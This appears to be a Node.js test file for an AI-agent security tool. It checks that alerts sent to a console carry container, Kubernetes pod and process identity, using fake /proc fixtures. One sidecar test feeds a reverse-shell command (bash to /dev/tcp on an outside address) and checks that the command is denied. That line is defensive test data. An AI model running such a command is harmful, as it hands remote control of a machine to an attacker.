// The `workload` object on alerts (cli/server-mode.mjs workloadIdentity): container id from
// /proc/self/cgroup or /proc/self/mountinfo, Kubernetes pod / namespace / node from MOORAI_K8S_*, and the
// agent pid on the hook path. A fake proc root per runtime layout; the SDK reporter, the sidecar and the
// gateway each shown attaching it to what they post to the console.
//
//   node --test --import ./test/hermetic-env.mjs test/workload-identity.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { spawn } from "node:child_process";
import http from "node:http";
import { workloadIdentity, containerIdFromCgroup, containerIdFromMountinfo, cleanWorkload } from "../cli/server-mode.mjs";
import { createReporter } from "../packages/agent-sdk/src/report.mjs";
import { rmTree } from "./fs-cleanup.mjs";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const ID = "58c64e0e177490c196203d3a1ab8a0a3fa5aa1a3448885b8c61d472fbc1fc0ba";
const ID2 = "4f1c2b9a7e3d5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8";
const SANDBOX = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
const UID = "pod6a1f2c3d_4e5f_6789_abcd_ef0123456789";

// Every layout this detects, as the runtime writes it.
const FIXTURES = {
  "cgroup v1, docker (cgroupfs driver)": { cgroup: `12:memory:/docker/${ID}\n11:cpu,cpuacct:/docker/${ID}\n1:name=systemd:/docker/${ID}\n`, want: ID },
  "cgroup v1, kubernetes cgroupfs driver": { cgroup: `11:pids:/kubepods/besteffort/pod6a1f2c3d-4e5f-6789-abcd-ef0123456789/${ID2}\n`, want: ID2 },
  "cgroup v2, docker systemd driver": { cgroup: `0::/system.slice/docker-${ID}.scope\n`, want: ID },
  "cgroup v2, containerd under kubernetes": { cgroup: `0::/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-${UID}.slice/cri-containerd-${ID2}.scope\n`, want: ID2 },
  "cgroup v2, cri-o": { cgroup: `0::/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-${UID}.slice/crio-${ID}.scope\n`, want: ID },
  "cgroup v2, podman": { cgroup: `0::/user.slice/user-1000.slice/user@1000.service/user.slice/libpod-${ID2}.scope/container\n`, want: ID2 },
  // MEASURED shape: Docker 29.6.1, node:22-slim, cgroup v2 with a private cgroup namespace.
  "cgroup v2 private namespace, docker mountinfo": {
    cgroup: "0::/\n",
    mountinfo: `200 199 0:44 / / rw,relatime master:1 - overlay overlay rw\n213 202 254:1 /docker/containers/${ID}/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/vda1 rw,discard\n214 202 254:1 /docker/containers/${ID}/hostname /etc/hostname rw,relatime - ext4 /dev/vda1 rw,discard\n`,
    want: ID
  },
  "cgroup v2 private namespace, cri-o mountinfo": {
    cgroup: "0::/\n",
    mountinfo: `1310 1301 0:25 /containers/storage/overlay-containers/${ID2}/userdata/hostname /etc/hostname rw,nosuid,nodev - tmpfs tmpfs rw\n`,
    want: ID2
  },
  "containerd sandbox hostname is the pause container, not this one": {
    cgroup: "0::/\n",
    mountinfo: `900 890 254:1 /var/lib/containerd/io.containerd.grpc.v1.cri/sandboxes/${SANDBOX}/hostname /etc/hostname rw - ext4 /dev/vda1 rw\n`,
    want: ""
  },
  "cri-o conmon scope is the monitor, not the container": { cgroup: `0::/kubepods.slice/crio-conmon-${ID}.scope\n`, want: "" },
  "a container path on some other mount point is ignored": {
    cgroup: "0::/\n",
    mountinfo: `300 200 254:1 /docker/containers/${ID}/mounts/secrets /run/secrets rw - ext4 /dev/vda1 rw\n`,
    want: ""
  },
  "non-container host (systemd session)": {
    cgroup: "0::/user.slice/user-1000.slice/session-2.scope\n",
    mountinfo: "22 1 8:2 / / rw,relatime shared:1 - ext4 /dev/sda2 rw\n",
    want: ""
  }
};

function procRoot({ cgroup, mountinfo }) {
  const dir = mkdtempSync(join(tmpdir(), "moorai-proc-"));
  mkdirSync(join(dir, "self"));
  if (cgroup !== undefined) writeFileSync(join(dir, "self", "cgroup"), cgroup);
  if (mountinfo !== undefined) writeFileSync(join(dir, "self", "mountinfo"), mountinfo);
  return dir;
}

for (const [name, f] of Object.entries(FIXTURES)) {
  test(`WORKLOAD containerId: ${name}`, () => {
    const dir = procRoot(f);
    try {
      const w = workloadIdentity({ env: {}, procRoot: dir });
      if (f.want) assert.deepEqual(w, { containerId: f.want });
      else assert.equal(w, null, `no container id may be guessed, got ${JSON.stringify(w)}`);
    } finally { rmTree(dir); }
  });
}

test("WORKLOAD containerId: cgroup wins over mountinfo, and a missing proc root yields nothing", () => {
  assert.equal(containerIdFromCgroup(`0::/system.slice/docker-${ID2}.scope`), ID2);
  assert.equal(containerIdFromMountinfo(`1 1 1:1 /docker/containers/${ID}/hosts /etc/hosts rw - ext4 x rw`), ID);
  const dir = procRoot({ cgroup: `0::/system.slice/docker-${ID2}.scope\n`, mountinfo: `1 1 1:1 /docker/containers/${ID}/hosts /etc/hosts rw - ext4 x rw\n` });
  try { assert.equal(workloadIdentity({ env: {}, procRoot: dir }).containerId, ID2); } finally { rmTree(dir); }
  assert.equal(workloadIdentity({ env: {}, procRoot: join(tmpdir(), "moorai-no-such-proc-root") }), null);
});

test("WORKLOAD kubernetes: pod / namespace / node from MOORAI_K8S_*, bad values dropped one by one", () => {
  const none = join(tmpdir(), "moorai-no-such-proc-root");
  const env = { MOORAI_K8S_POD: "billing-agent-7c9f8d6b5-x2x4q", MOORAI_K8S_NAMESPACE: "agents", MOORAI_K8S_NODE: "ip-10-0-3-17.eu-west-1.compute.internal" };
  assert.deepEqual(workloadIdentity({ env, procRoot: none }), { pod: env.MOORAI_K8S_POD, namespace: "agents", node: env.MOORAI_K8S_NODE });
  assert.deepEqual(workloadIdentity({ env: { ...env, MOORAI_K8S_POD: "Billing_Agent" }, procRoot: none }), { namespace: "agents", node: env.MOORAI_K8S_NODE }, "uppercase/underscore is not a k8s name");
  assert.deepEqual(workloadIdentity({ env: { ...env, MOORAI_K8S_NODE: "a".repeat(254) }, procRoot: none }), { pod: env.MOORAI_K8S_POD, namespace: "agents" }, "over 253 chars is dropped, not truncated");
  assert.deepEqual(workloadIdentity({ env: { ...env, MOORAI_K8S_NAMESPACE: "agents\nx" }, procRoot: none }), { pod: env.MOORAI_K8S_POD, node: env.MOORAI_K8S_NODE });
  assert.deepEqual(workloadIdentity({ env, procRoot: none, refused: ["MOORAI_K8S_POD"] }), { namespace: "agents", node: env.MOORAI_K8S_NODE }, "a name a settings file set is never read");
});

test("WORKLOAD pid: a positive integer is kept (the hook passes its parent pid); anything else is dropped", () => {
  const none = join(tmpdir(), "moorai-no-such-proc-root");
  assert.deepEqual(workloadIdentity({ env: {}, procRoot: none, pid: process.ppid }), { pid: process.ppid });
  for (const bad of [0, -4, 1.5, "123", NaN, 2 ** 40]) assert.equal(workloadIdentity({ env: {}, procRoot: none, pid: bad }), null, `pid ${bad}`);
});

test("WORKLOAD cleanWorkload: unknown keys and bad values dropped, not the whole object", () => {
  assert.deepEqual(cleanWorkload({ containerId: ID.slice(0, 12), pod: "p", extra: "x", pid: 42, namespace: "NS" }), { containerId: ID.slice(0, 12), pod: "p", pid: 42 });
  assert.equal(cleanWorkload({ containerId: "XYZ", pod: "" }), null);
  assert.equal(cleanWorkload({ containerId: ID.slice(0, 11) }), null, "under 12 hex");
  assert.equal(cleanWorkload([]), null);
});

// ---- the surfaces that post ----
function capture() {
  const bodies = [];
  const fetchImpl = async (url, init) => { bodies.push(JSON.parse(init.body)); return { ok: true }; };
  return { bodies, fetchImpl };
}
const CONFIG = { serverUrl: "http://console.invalid", tenant: "acme", installToken: "tok" };

test("WORKLOAD SDK reporter: the sidecar surface attaches containerId + k8s names and no pid", async () => {
  const dir = procRoot(FIXTURES["cgroup v2, containerd under kubernetes"]);
  try {
    const { bodies, fetchImpl } = capture();
    const r = createReporter({ config: CONFIG, identity: { user: "service", device: "svc:x", surface: "serve" }, fetchImpl, env: { MOORAI_K8S_POD: "agent-0", MOORAI_K8S_NAMESPACE: "agents" }, procRoot: dir });
    await r.post({ threatId: 54, category: "Reverse shell", riskLevel: "Blocked", stage: "tool", tool: "hook:Bash", contentHash: "h" });
    assert.deepEqual(bodies[0].workload, { containerId: ID2, pod: "agent-0", namespace: "agents" });
  } finally { rmTree(dir); }
});

test("WORKLOAD SDK reporter: in-process (agent-sdk) adds this process's pid; nothing detected -> no key at all", async () => {
  const none = join(tmpdir(), "moorai-no-such-proc-root");
  const a = capture();
  await createReporter({ config: CONFIG, identity: { surface: "agent-sdk" }, fetchImpl: a.fetchImpl, env: {}, procRoot: none }).post({ threatId: 1, category: "c", riskLevel: "High" });
  assert.deepEqual(a.bodies[0].workload, { pid: process.pid });
  const b = capture();
  await createReporter({ config: CONFIG, identity: { surface: "serve" }, fetchImpl: b.fetchImpl, env: {}, procRoot: none }).post({ threatId: 1, category: "c", riskLevel: "High" });
  assert.equal("workload" in b.bodies[0], false, "an empty workload must be omitted, not sent as {}");
  const c = capture();
  await createReporter({ config: CONFIG, identity: { surface: "serve" }, fetchImpl: c.fetchImpl, workload: { pod: "Bad_Name", node: "n1", foo: 1 } }).post({ threatId: 1, category: "c", riskLevel: "High" });
  assert.deepEqual(c.bodies[0].workload, { node: "n1" }, "an explicit workload is validated too");
});

test("WORKLOAD sidecar: moorai-serve's console alert for a denied reverse shell carries the workload", async () => {
  process.env.MOORAI_K8S_POD = "agent-0";
  process.env.MOORAI_K8S_NAMESPACE = "agents";
  process.env.MOORAI_K8S_NODE = "node-a";
  const { createServer } = await import("../cli/moorai-serve.mjs");
  const { bodies, fetchImpl } = capture();
  const s = await createServer({ port: 0, console: CONFIG, fetch: fetchImpl, env: {}, policy: { captureTier: "content-free", builtinDefault: true } });
  try {
    const r = await fetch(`${s.url}/v1/tool-call`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ tool: "Bash", input: { command: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" } }) });
    const v = await r.json();
    assert.equal(v.decision, "deny");
    await s.runtime.flush();
    const shell = bodies.find((b) => b.threatId === 54);
    assert.ok(shell, `no #54 alert posted: ${JSON.stringify(bodies.map((b) => b.threatId))}`);
    assert.equal(shell.workload.pod, "agent-0");
    assert.equal(shell.workload.namespace, "agents");
    assert.equal(shell.workload.node, "node-a");
    assert.equal("pid" in shell.workload, false, "the sidecar is not the agent process");
    assert.equal(JSON.stringify(v).includes("workload"), false, "the verdict returned to the caller is unchanged");
  } finally {
    await s.close();
    for (const k of ["MOORAI_K8S_POD", "MOORAI_K8S_NAMESPACE", "MOORAI_K8S_NODE"]) delete process.env[k];
  }
});

test("WORKLOAD gateway: mcp-gateway/report.mjs post() attaches the workload to the console alert, not to the ledger", async () => {
  const alerts = [];
  const con = http.createServer((req, res) => {
    let b = ""; req.on("data", (c) => (b += c));
    req.on("end", () => { if (req.url === "/api/alerts") { try { alerts.push(JSON.parse(b)); } catch { /* ignore */ } } res.writeHead(200); res.end("{}"); });
  });
  await new Promise((r) => con.listen(0, "127.0.0.1", r));
  const url = `http://127.0.0.1:${con.address().port}`;
  const home = mkdtempSync(join(tmpdir(), "moorai-gw-wl-"));
  mkdirSync(join(home, ".moorai"), { recursive: true });
  writeFileSync(join(home, ".moorai", "config.json"), JSON.stringify({ serverUrl: url, tenant: "acme", installToken: "tok" }));
  const script = `const r = await import(${JSON.stringify(join(ROOT, "mcp-gateway", "report.mjs"))}); await r.post({ threatId: 0, category: "MCP: unapproved server", riskLevel: "Blocked", stage: "mcp", tool: "gateway:x", contentHash: "h", ...r.IDENTITY }); process.stdout.write(JSON.stringify(r.IDENTITY));`;
  const env = { ...process.env, HOME: home, USERPROFILE: home, MOORAI_K8S_POD: "gw-0", MOORAI_K8S_NAMESPACE: "agents" };
  delete env.MOORAI_MODE;
  try {
    const out = await new Promise((resolve, reject) => {
      const c = spawn(process.execPath, ["--input-type=module", "-e", script], { env, cwd: home, stdio: ["ignore", "pipe", "pipe"] });
      let o = "", e = "";
      c.stdout.on("data", (d) => (o += d)); c.stderr.on("data", (d) => (e += d));
      c.on("exit", (code) => (code === 0 ? resolve(o) : reject(new Error(`exit ${code}: ${e}`))));
    });
    assert.equal(alerts.length, 1);
    assert.equal(alerts[0].workload.pod, "gw-0");
    assert.equal(alerts[0].workload.namespace, "agents");
    assert.equal("pid" in alerts[0].workload, false);
    assert.equal("workload" in JSON.parse(out), false, "IDENTITY (also spread into ledger entries) is unchanged");
  } finally {
    await new Promise((r) => { con.closeAllConnections?.(); con.close(r); });
    rmTree(home);
  }
});
